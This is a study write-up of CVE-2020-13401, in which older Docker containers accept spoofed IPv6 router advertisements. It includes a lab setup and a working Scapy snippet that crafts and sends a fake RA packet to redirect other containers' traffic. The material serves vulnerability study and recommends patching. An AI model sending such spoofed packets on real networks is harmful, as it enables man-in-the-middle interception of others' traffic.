# CVE-2020-13401 Study
_Study on CVE-2020-13401 vulnerability of containers in dockers older than 19.03.11_

Containers that are created with Docker Engine versions before 19.03.11 are vulnerable to receive and apply fake RA (Router Advertisement) messages from other containers in the network. Receiving RAs is a normal behavior of operating system, but if the RA sender is not trusted in the network, the victim container can receive the message and join the netwok and then send all network packets to the new fake router (_man-in-the-middle attack_). This issue is not related to IPv4 and it is based on IPv6. 

Original CVE Item Source: [CVE-2020-13401](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-13401)

## Why it happens?
In the Docker Engines older than 19.03.11 containers accept RA messages _by default_. Consider there's another container in the network with `CAP_NET_RAW` capability. It means that this container can create any network packets and send to the network. So, this container can be used as a packet crafting source. In newer versions, containers don't accept RA messages unless this feature is enabled on docker engine. So, the system might still be vulnerable if an administrator decides to enable this feature. 

## Solution
It is highly recommended to update Docker Engine to protect your containers environment against this vulnerability. 

## Simulating the Vulnerability
In this study I want to demonstrate how this vulnerability happens and see how our container is affected by RA message

## Requirements
- Docker Engine before 19.03.11
- Ubuntu Docker Images 
- IPv6 Enabled on Host Machine
- Docker Engine Configured for IPv6 Functionality
- IP Spoofing Tool _Scapy_   

In running containers, I tested to verify if IPv6 is working. But I found that there’s no IPv6 supported by default in my container. By default, all docker containers are connected to a `bridge` network and this network does not support IPv6. To enable IPv6 for docker it is required to add a `daemon.json` file to the path `/etc/docker/`. Contents of this file should be as follows:

```sh
{  "ipv6": true, "fixed-cidr-v6": "fd00::/80" }
```

It is possible to assign any valid IPv6 subnet address. Then docker should be restarted and read the daemon file again from scratch to configure its default bridge network. Also, it is possible to define a new network for supporting IPv6.   

Commands to reload the configuration and restart the docker: 
- `$ sudo systemctl daemon-reload`
- `$ sudo systemctl restart docker`

## Creating Containers 
So far we have a Docker that supports IPv6 and it's time to create the containers to start the simulation. We need atleast 2 containers. I call them `Ubuntu_1` and `Ubuntu_2`. On your host machine use the following commands to create your containers: 

```sh
$ docker pull ubuntu

$ docker run --name ubuntu_1 -i -t ubuntu bash 

$ docker run --name ubuntu_2 -i -t ubuntu bash 
```

List your containers usng this command: 

```sh
$ docker container ls -a
```
Use your container names to run them: 

```sh 
$ docker container start -ai [CONTAINER NAME]
```

On both containers you need some basic tools such as:

| Tool | Install Command |
| ------ | ------ |
| nano (or any other editor) | apt-get install nano |
| net-tools | apt-get install net-tools |
| hping3 | apt-get install hping3 | 
| tcpdump | apt-get install tcpdump |
| scapy | apt install python3-scapy _(only intall on 1 container)_|

Install the required tools and verify if the your containers are connected. To do so, get your container IP and interfaces information using `ifconfig` command. Then `ping -6 [destination IPv6]` the other container to make sure they are connected. Also, you can use the `tcpdump` on your destination container to see the receiving ping packets. 
_(Make sure you are using IPv6 to ping the containers)_

## Main Objective:
We want to send a crafted RA message from one of the containers in the network and update the IpTable of the victims. 


## Creating RA Message Using Scapy
I am using _SCAPY_ to create IPv6 router advertisement messages. Scapy is based on Python. The installation steps are as follows:  

- Install Python (ubuntu 20.04 is shipped with python already installed and I’ll update it only) 
- Install Scapy `$ sudo apt install python3-scapy` 

RA packet is a broadcast packet, and it means it should deliver to all network nodes. Also, it is based on IPv6 rules. So, the destination address is `ff01::1` and the protocol is based on `ICMPv6`.

Run Scapy: 

`$ scapy`

I use these commands to craft and send the packet to the network: 

```sh
a = IPv6()            

a.dst = "ff02::1" 

a.display() 

b = ICMPv6ND_RA() 

b.display()  

c = ICMPv6NDOptSrcLLAddr() 

c.lladdr = "02:42:ac:11:00:02" 

c.display() 

d = ICMPv6NDOptMTU() 

d.display() 

e = ICMPv6NDOptPrefixInfo() 

e.prefixlen = 64  

e.prefix = "d00d::" 

e.display()  

send(a/b/c/d/e) 
```

After sending the packet, go to the other containers and use `ifconfig` again. You will see that your IPTable is updated after receiving the RA messages. 

## My Docker Images
You can pull my customized docker images to test and study this issue: 
[My Customized Docker Images](https://hub.docker.com/r/zaeimidocker/containers_vulnerability_study/tags?page=1&ordering=last_updated)


